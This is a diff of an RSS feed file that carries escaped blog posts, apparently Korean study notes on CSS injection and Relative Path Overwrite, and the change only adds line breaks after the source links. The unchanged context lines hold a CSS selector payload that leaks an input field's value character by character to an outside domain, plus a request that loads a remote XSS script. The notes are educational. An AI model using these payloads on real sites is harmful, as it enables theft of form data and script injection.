@@ -98,7 +98,7 @@
 &lt;span class=&#34;nt&#34;&gt;input&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;^=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;z&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;background&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;http://ourdomain.com/?char1=z&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;출처&#34;&gt;출처&lt;/h2&gt;
 &lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://learn.dreamhack.io/327&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
-    &gt;https://learn.dreamhack.io/327&lt;/a&gt;
+    &gt;https://learn.dreamhack.io/327&lt;/a&gt;&lt;br&gt;
 &lt;a class=&#34;link&#34; href=&#34;https://velog.io/@hunjison/CSS-Injection&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;https://velog.io/@hunjison/CSS-Injection&lt;/a&gt;&lt;/p&gt;
 </description>
@@ -138,7 +138,7 @@ GET /page?test=//www.hahwul.com/xss.js
 ...
 &lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;참고&#34;&gt;참고&lt;/h2&gt;
 &lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://learn.dreamhack.io/328#4&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
-    &gt;https://learn.dreamhack.io/328#4&lt;/a&gt;
+    &gt;https://learn.dreamhack.io/328#4&lt;/a&gt;&lt;br&gt;
 &lt;a class=&#34;link&#34; href=&#34;https://www.hahwul.com/cullinan/rpo/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;https://www.hahwul.com/cullinan/rpo/&lt;/a&gt;&lt;/p&gt;
 </description>
